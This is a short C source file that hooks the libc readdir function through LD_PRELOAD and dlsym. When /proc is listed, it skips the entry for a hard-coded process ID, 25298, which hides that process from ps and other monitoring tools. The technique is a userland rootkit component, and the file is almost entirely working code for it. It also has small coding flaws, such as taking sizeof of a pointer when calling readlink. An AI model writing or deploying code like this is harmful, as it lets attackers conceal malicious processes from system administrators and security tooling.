#define _GNU_SOURCE
#include <dlfcn.h>
#include <stdio.h>
#include <string.h>
#include <dirent.h>
#include <unistd.h>
#include <sys/types.h>
#define __libc_lock_define(CLASS,NAME)
#define BUF_SIZE 1024

struct __dirstream
   {
    void *__fd;
    char *__data;
    int __entry_data;
    char *__ptr;
    int __entry_ptr;
    size_t __allocation;
    size_t __size;
     __libc_lock_define (, __lock)
   };

//查看当前打开的是否为/proc
int dirnamefd(DIR *dirp,char *filter_path){

  int fd = dirfd (dirp);
  if(fd == -1){
    return 0;
  }

  char path[128]={0};
  sprintf (path, "/proc/self/fd/%d",fd);

  ssize_t kk = readlink (path, filter_path, sizeof (filter_path));
  if(kk == -1){
    return 0;
  }

  filter_path[kk]=0;
  return 1;
}

typedef struct __dirstream DIR;

struct dirent *readdir(DIR *dirp){
  typeof(readdir) *truereaddir;
  char PID[128]={0};
  sprintf (PID, "25298");


  struct dirent *content;

  truereaddir = dlsym(RTLD_NEXT, "readdir");
  if(truereaddir ==NULL){
    fprintf (stderr, "Failed in dlsym");
    return NULL;
  }

  while (1)
    {
        content = truereaddir(dirp);

        if(content){

        char path_filter[128]={0};
        if(dirnamefd(dirp,path_filter) && strcmp (path_filter,"/proc")==0 && strcmp(content->d_name,PID)==0){
            continue;
          }
        }
      break;
    }


  return content;
}
